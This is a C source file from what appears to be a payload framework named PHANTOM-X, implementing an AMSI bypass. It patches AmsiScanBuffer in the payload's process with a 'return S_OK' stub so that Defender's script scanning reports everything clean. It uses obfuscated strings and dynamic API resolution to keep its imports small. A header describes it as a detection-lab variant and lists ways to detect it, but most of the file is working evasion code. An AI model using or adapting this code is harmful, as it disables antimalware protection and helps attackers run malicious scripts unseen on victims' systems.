/* ================================================================== */
/* PHANTOM-X :: AMSI bypass variant                                     */
/* ================================================================== */
/*                                                                        */
/* WHAT IT DOES                                                          */
/*     AMSI (Antimalware Scan Interface) is the Microsoft facility that */
/*     hands script content to Defender for inspection before PowerShell */
/*     or another script host runs it.                                  */
/*                                                                        */
/*     This variant makes the payload's content invisible to AMSI by     */
/*     patching AmsiScanBuffer inside the AMSI module so that it reports      */
/*     "clean" without scanning anything.                                */
/*                                                                        */
/* THE TECHNIQUE                                                         */
/*     the AMSI module exports AmsiScanBuffer. Its prologue can be replaced   */
/*     with a stub that returns S_OK (0) immediately. The stub is:     */
/*                                                                        */
/*         xor  eax, eax     ; EAX = 0 (S_OK)                            */
/*         ret                                                           */
/*                                                                        */
/*     Two bytes of code, applied to a function prologue. That is the   */
/*     whole technique, and it has been publicly documented for years.  */
/*                                                                        */
/* WHY IT IS HERE                                                        */
/*     Because a detection that relies on AMSI is a detection that     */
/*     disappears the moment someone patches two bytes. If the lab's   */
/*     own rules depend on AMSI, the lab needs to know that, and the    */
/*     only way to know it is to build the variant and run it.          */
/*                                                                        */
/*     The important thing is that the resulting payload is STILL      */
/*     detected -- by Sysmon, by behavioural rules, by the memory       */
/*     telemetry. A variant that no longer generates any signal at all  */
/*     would be useless to the lab; this one is caught differently.     */
/*                                                                        */
/* DETECTION NOTES                                                       */
/*     This variant is detectable in at least three independent ways,   */
/*     none of which depend on AMSI:                                     */
/*                                                                        */
/*       1. The patched the AMSI module page becomes writable+executable      */
/*          (Sysmon EventID 10 / any EDR on VirtualProtect).            */
/*       2. AmsiScanBuffer's first bytes no longer match the original  */
/*          module (a module-hashing check catches it).                 */
/*       3. Everything else the payload does is unchanged, so the      */
/*          process, memory and network telemetry is identical to the  */
/*          baseline arm.                                                */
/*                                                                        */
/* SCOPE                                                                  */
/*     This patches AMSI inside the PAYLOAD's own process. It does not  */
/*     touch other processes and it is not persistent: it lasts exactly */
/*     as long as the payload runs.                                     */
/* ================================================================== */

#include "px_config.h"

#if PX_AMSI_BYPASS

#include "px_strings.h"
#include "px_obfuscate.h"

/* The string table indices. These must match px_strings.def. */
/* The stub that replaces AmsiScanBuffer's prologue.
 *
 *   xor eax, eax   -> 31 C0
 *   ret            -> C3
 *
 * AmsiScanBuffer returns a long (HRESULT). Zero is S_OK, which means
 * "scanned and found clean", so the caller proceeds. */
static const unsigned char px_amsi_stub[] = { 0x31, 0xC0, 0xC3 };

/* Find a module that is already loaded, without adding an import.
 *
 * GetModuleHandleA is used rather than LoadLibraryA so that the patch
 * applies to the instance the script host is actually using. */
typedef HMODULE (WINAPI *fn_getmodulehandlea)(const char *);

static HMODULE px_find_loaded_module(const char *name, fn_getmodulehandlea p)
{
    return p ? p(name) : NULL;
}

/* Whether the AMSI patch actually took.
 *
 * The capability library reports it, so a run can say whether its own
 * evasion worked rather than assuming it. */
/* Apply the AMSI bypass.
 *
 * Returns 1 on success, 0 on failure. Failure is not fatal: a payload
 * that cannot patch AMSI still runs, it is just visible to AMSI, and the
 * lab wants to see that difference rather than have the payload die. */
int px_amsi_bypass(void)
{
    char dll_name[64];
    char func_name[64];
    HMODULE amsi;
    void *fn;
    unsigned char *prologue;
    DWORD old_protect = 0;
    int ok = 0;

    px_obf_decode(PX_SID_AMSI_DLL, dll_name, sizeof(dll_name));
    px_obf_decode(PX_SID_AMSI_SCAN, func_name, sizeof(func_name));

    /* GetModuleHandleA is resolved dynamically so that the payload's
     * static import table stays limited to what the reflective loader
     * can resolve: modules the target process already has loaded. */
    {
        char k32[32];
        px_obf_decode(PX_SID_KERNEL32, k32, sizeof(k32));
        amsi = px_find_loaded_module(dll_name,
                (fn_getmodulehandlea)(void *)GetProcAddress(
                    GetModuleHandleA(k32), "GetModuleHandleA"));
    }
    if (!amsi) {
        /* the AMSI module is not loaded. In a process that never touched a
         * script host, AMSI is not in the picture anyway, so there is
         * nothing to bypass. */
        return 0;
    }

    fn = GetProcAddress(amsi, func_name);
    if (!fn)
        return 0;

    prologue = (unsigned char *)fn;

    /* The page has to be made writable and executable. The old
     * protection is restored afterwards, because leaving a page as
     * writable+executable when it did not need to be is itself an
     * anomaly that a defender can see. */
    if (!VirtualProtect(prologue, sizeof(px_amsi_stub),
                        PAGE_EXECUTE_READWRITE, &old_protect))
        return 0;

    memcpy(prologue, px_amsi_stub, sizeof(px_amsi_stub));

    {
        DWORD ignored;
        VirtualProtect(prologue, sizeof(px_amsi_stub), old_protect, &ignored);
    }

    /* Flush the instruction cache so the patched bytes are the ones
     * that execute, not the ones that were there. On x86 this matters;
     * on ARM64 it is essential. */
    FlushInstructionCache(GetCurrentProcess(), prologue, sizeof(px_amsi_stub));
    px_amsi_patched = 1;

    ok = 1;
    return ok;
}

#else  /* !PX_AMSI_BYPASS */

int px_amsi_bypass(void)
{
    /* The baseline arm does not touch AMSI. */
    return 0;
}

#endif /* PX_AMSI_BYPASS */
